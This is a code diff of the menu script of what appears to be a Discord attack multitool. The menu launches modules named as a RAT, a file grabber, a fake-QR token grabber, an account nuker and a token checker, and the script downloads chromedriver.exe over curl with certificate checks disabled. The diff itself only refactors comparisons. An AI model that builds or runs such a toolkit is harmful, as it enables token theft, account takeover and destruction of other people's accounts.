@@ -16,39 +16,39 @@ def main():
     global choice
     choice = input(f"""{y}[{b}#{y}]{w} Choice: """)
 
-    if choice == '1' or choice == '01':
+    if choice in ['1', '01']:
         transition()
         selfbottitle()
         input(f"{y}[{Fore.LIGHTRED_EX }!{y}]{w} This tool is under development, so it is not yet usable.")
         main()
-    elif choice == '2' or choice == '02':
+    elif choice in ['2', '02']:
         transition()
         exec(open('util/2_Rat/rat.py').read())
-    elif choice == '3' or choice == '03':
+    elif choice in ['3', '03']:
         transition()
         raidtitle()
         input(f"{y}[{Fore.LIGHTRED_EX }!{y}]{w} This tool is under development, so it is not yet usable.")
         main()
-    elif choice == '4' or choice == '04':
+    elif choice in ['4', '04']:
         transition()
         raidtitle()
         input(f"{y}[{Fore.LIGHTRED_EX }!{y}]{w} This tool is under development, so it is not yet usable.")
         main()
-    elif choice == '5' or choice == '05':
+    elif choice in ['5', '05']:
         transition()
         subprocess.call([r'util\\5_VidCrashMaker\\crashvideomaker.bat'])
-    elif choice == '6' or choice == '06':
+    elif choice in ['6', '06']:
         transition()
         exec(open('util/6_FileGrab/filegrabber.py').read())
-    elif choice == '7' or choice == '07':
+    elif choice in ['7', '07']:
         transition()
         imagegrabbertitle()
         input(f"{y}[{Fore.LIGHTRED_EX }!{y}]{w} This tool is under development, so it is not yet usable.")
         main()
-    elif choice == '8' or choice == '08':
+    elif choice in ['8', '08']:
         transition()
         exec(open('util/8_TokenFakeQr/fakeqr.py').read())
-    elif choice == '9'or choice == '09':
+    elif choice in ['9', '09']:
         transition()
         exec(open('util/9_AccountNuker/accountnuker.py').read())
     elif choice == '10':
@@ -70,7 +70,7 @@ def main():
         exec(open('util/14_AutoLogin/autologin.py').read())
     elif choice == '15':
         transition()
-        exec(open('util/15_TokensChecker/tokenschecker.py').read()) 
+        exec(open('util/15_TokensChecker/tokenschecker.py').read())
     elif choice == '16':
         transition()
         exec(open('util/16_ClearDM/cleardm.py').read())
@@ -126,13 +126,13 @@ def main():
 if __name__ == "__main__":
     import sys
     setTitle("@TIO Premium Loading...")
-    
+
     System.Size(120, 30)
     Anime.Fade(Center.Center(banner), Colors.purple_to_blue, Colorate.Vertical, time=1)
     if not os.path.exists("output"):
         os.makedirs("output", exist_ok=True)
     if os.path.exists("output/QR-Code"):
-        shutil.rmtree(f"output/QR-Code")
+        shutil.rmtree("output/QR-Code")
     os.system("""if not exist "util/chromedriver.exe" echo [#] Downloading chromedriver: """)
     os.system("""if not exist "util/chromedriver.exe" curl -#fkLo "util/chromedriver.exe" "https://github.com/AstraaDev/complement/raw/main/chromedriver.exe" """)
     if os.path.basename(sys.argv[0]).endswith("exe"):
